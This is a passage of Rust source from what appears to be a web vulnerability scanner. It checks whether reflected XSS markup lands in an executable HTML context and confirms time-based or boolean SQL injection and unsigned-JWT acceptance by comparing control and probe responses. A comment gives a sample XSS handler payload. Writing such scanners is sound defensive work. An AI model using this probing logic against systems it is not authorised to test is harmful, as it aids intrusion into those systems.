            cursor += 4 + end + 3;
            continue;
        }
        if bytes[cursor] != b'<' {
            cursor += 1;
            continue;
        }
        let closing = tail.starts_with(b"</");
        let start = cursor + if closing { 2 } else { 1 };
        if !bytes.get(start).is_some_and(u8::is_ascii_alphabetic) {
            if tail.starts_with(b"<!") || tail.starts_with(b"<?") {
                let Some(end) = html_tag_end(bytes, start, limit) else {
                    return false;
                };
                cursor = end;
            } else {
                cursor += 1;
            }
            continue;
        }
        let mut name_end = start;
        while name_end < limit && !html_tag_boundary(bytes[name_end]) {
            name_end += 1;
        }
        if name_end == limit || !html_tag_boundary(bytes[name_end]) {
            return false;
        }
        let tag = &lower[start..name_end];
        let Some(end) = html_tag_end(bytes, name_end, limit) else {
            return false;
        };
        cursor = end;
        if closing {
            match tag {
                "template" => templates = templates.saturating_sub(1),
                "select" => select = false,
                "math" => math = math.saturating_sub(1),
                _ => {}
            }
        } else {
            match tag {
                "template" => templates += 1,
                "select" => select = !select,
                "math" => math += 1,
                "frameset" => frameset = true,
                "script" | "style" | "textarea" | "title" | "xmp" | "noscript" | "iframe"
                | "noembed" | "noframes" | "plaintext" => raw = Some(tag),
                _ => {}
            }
        }
    }
    raw.is_none() && templates == 0 && !select && math == 0 && !frameset
}

/// True when the injected markup appears in an executable token context, either
/// verbatim or with quote character references inside the tag (for example
/// `onload=alert(&#39;x&#39;)`). Only quotes are compared leniently: decoding
/// `<` would resurrect escaped markup.
fn xss_execution_context(body: &str, payload: &str) -> bool {
    let markup = xss_markup(payload);
    if html_execution_context(body, markup) {
        return true;
    }
    let tag = ["<svg", "<img", "<details"]
        .iter()
        .find_map(|name| markup.find(name).map(|index| &markup[index..]))
        .unwrap_or(markup);
    let Some(tag_start) = tag.get(..4) else {
        return false;
    };
    let lower = body.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut searched = 0usize;
    let mut checked = 0usize;
    while let Some(offset) = body[searched..].find(tag_start) {
        let index = searched + offset;
        if executable_prefix(&lower, bytes, index) && markup_matches(&body[index..], tag) {
            return true;
        }
        checked += 1;
        if checked >= 16 {
            break;
        }
        searched = index + tag_start.len();
        if searched >= body.len() {
            break;
        }
    }
    false
}

/// Compare injected markup against reflected text, allowing quote character
/// references where the payload used a literal quote.
fn markup_matches(body: &str, markup: &str) -> bool {
    let mut rest = body;
    let mut wanted = markup;
    while let Some(character) = wanted.chars().next() {
        if character == '\'' || character == '"' {
            if let Some(tail) = quote_entity(rest, character) {
                rest = tail;
            } else if rest.starts_with(character) {
                rest = &rest[character.len_utf8()..];
            } else {
                return false;
            }
        } else {
            if !rest.starts_with(character) {
                return false;
            }
            rest = &rest[character.len_utf8()..];
        }
        wanted = &wanted[character.len_utf8()..];
    }
    true
}

fn quote_entity(value: &str, quote: char) -> Option<&str> {
    const SINGLE: [&str; 5] = ["&#39;", "&#039;", "&#x27;", "&#X27;", "&apos;"];
    const DOUBLE: [&str; 5] = ["&#34;", "&#034;", "&#x22;", "&#X22;", "&quot;"];
    let entities = if quote == '\'' { &SINGLE } else { &DOUBLE };
    entities.iter().find_map(|entity| {
        value
            .get(..entity.len())
            .filter(|head| head.eq_ignore_ascii_case(entity))
            .map(|_| &value[entity.len()..])
    })
}

pub fn evaluate_series(baseline: &Exchange, results: &[(Probe, Exchange)]) -> Vec<Candidate> {
    if baseline.error.is_some() || Message::parse(&baseline.response).is_err() {
        return vec![];
    }
    let mut groups: std::collections::BTreeMap<(String, String), Vec<(&Probe, &Exchange)>> =
        std::collections::BTreeMap::new();
    for (probe, response) in results {
        if let Matcher::Series { family, .. } = &probe.matcher
            && response.error.is_none()
        {
            groups
                .entry((family.clone(), probe.insertion_point.clone()))
                .or_default()
                .push((probe, response));
        }
    }
    let mut findings = Vec::new();
    for ((family, point), entries) in groups {
        let expected = if family.ends_with("time") || family.starts_with("sql-bool") {
            2
        } else {
            1
        };
        let mut pairs = Vec::new();
        for pair in 0..expected {
            let select = |positive: bool| {
                entries.iter().find(|(p,_)|matches!(&p.matcher,Matcher::Series{pair:i,positive:v,..}if *i==pair&&*v==positive)).copied()
            };
            if let (Some(a), Some(b)) = (select(false), select(true)) {
                pairs.push((a, b));
            }
        }
        if pairs.len() != expected {
            continue;
        }
        let matched = if family.ends_with("time") {
            let controls: Vec<_> = pairs.iter().map(|((_, a), _)| a.duration_ms).collect();
            let deltas: Vec<_> = pairs
                .iter()
                .map(|((_, a), (_, b))| b.duration_ms.saturating_sub(a.duration_ms))
                .collect();
            // The required delay scales with the control's own latency and
            // jitter so a slow but healthy target is not a false negative.
            let control_span = controls.iter().max().unwrap() - controls.iter().min().unwrap();
            let required = (controls.iter().copied().max().unwrap_or_default() / 3)
                .max(control_span.saturating_mul(4))
                .max(1200);
            let stable = control_span < required;
            stable
                && deltas.iter().max().unwrap() - deltas.iter().min().unwrap() < required
                && pairs.iter().all(|((_, a), (_, b))| {
                    b.duration_ms >= a.duration_ms.saturating_add(required)
                        && a.status == baseline.status
                        && b.status == baseline.status
                        && Message::parse(&a.response)
                            .ok()
                            .zip(Message::parse(&b.response).ok())
                            .is_some_and(|(a, b)| {
                                if family.starts_with("sql-") {
                                    // Stable parser failures and changed query results are not
                                    // timing evidence. The delay must retain the selected result.
                                    let selected = Message::parse(&baseline.response).ok();
                                    (200..300).contains(&baseline.status)
                                        && bounded_body(&a, 4 * 1024 * 1024)
                                            .zip(bounded_body(&b, 4 * 1024 * 1024))
                                            .zip(
                                                selected
                                                    .as_ref()
                                                    .and_then(|m| bounded_body(m, 4 * 1024 * 1024)),
                                            )
                                            .is_some_and(|((control, positive), selected)| {
                                                control == positive
                                                    && control == selected
                                                    && !sql_error(&String::from_utf8_lossy(
                                                        &control,
                                                    ))
                                            })
                                } else {
                                    same_content(&a, &b)
                                }
                            })
                })
        } else if family.starts_with("jwt-") {
            let ((_, invalid), (_, unsigned)) = pairs[0];
            matches!(invalid.status, 401 | 403)
                && unsigned.status == baseline.status
                && (200..300).contains(&baseline.status)
                && Message::parse(&baseline.response)
                    .ok()
                    .zip(Message::parse(&unsigned.response).ok())
                    .is_some_and(|(a, b)| similar_content(&a, &b))
        } else {
            let fingerprint = |(probe, response): (&Probe, &Exchange)| -> Option<Vec<u8>> {
                let message = Message::parse(&response.response).ok()?;
                if message.status() != baseline.status || !(200..300).contains(&message.status()) {
                    return None;
                }
                let mut body = text_body(&message, 4 * 1024 * 1024)?;
                if sql_error(&body) {
                    return None;
                }
                if let Matcher::Series { payload, .. } = &probe.matcher {
                    body = body.replace(payload, "").replace(&encoded(payload), "");
                }
                Some(Sha256::digest(body).to_vec())
            };
            let false_bodies: Vec<_> = pairs.iter().map(|(a, _)| fingerprint(*a)).collect();
            let true_bodies: Vec<_> = pairs.iter().map(|(_, b)| fingerprint(*b)).collect();
            false_bodies.iter().all(Option::is_some)
                && true_bodies.iter().all(Option::is_some)
                && false_bodies.windows(2).all(|w| w[0] == w[1])
                && true_bodies.windows(2).all(|w| w[0] == w[1])
                && false_bodies[0] != true_bodies[0]
                && Message::parse(&baseline.response)
                    .ok()
                    .and_then(|m| text_body(&m, 4 * 1024 * 1024))
                    .is_some_and(|b| Some(Sha256::digest(b).to_vec()) == true_bodies[0])
        };
        if matched {
            let issue_id = &entries[0].0.issue_id;
            let mut c = candidate(
                issue_id,
                entries[0].1,
                Confidence::Firm,
                &point,
                format!(
                    "{expected} complete paired control/probe comparison(s) confirmed the {family} differential. Incomplete, unstable, or failed series do not report."
                ),
            );
            c.evidence = vec![Evidence {
                label: "Selected baseline".into(),
                exchange: baseline.clone(),
            }];
            for ((_, control), (_, positive)) in pairs {
                c.evidence.push(Evidence {
                    label: "Negative/control probe".into(),
                    exchange: control.clone(),
                });
                c.evidence.push(Evidence {
                    label: "Positive probe".into(),
                    exchange: positive.clone(),
                });
            }
            findings.push(c);
        }
    }
    findings.extend(advanced::evaluate_series(baseline, results));
    findings.extend(stored::evaluate_series(baseline, results));
    findings.extend(stylesheet::evaluate_series(baseline, results));
    findings
}

pub fn stored_plan(
    base: &Exchange,
    readbacks: &[Exchange],
    settings: &ScanSettings,
) -> anyhow::Result<Vec<Probe>> {
    stored::plan(base, readbacks, settings)
}
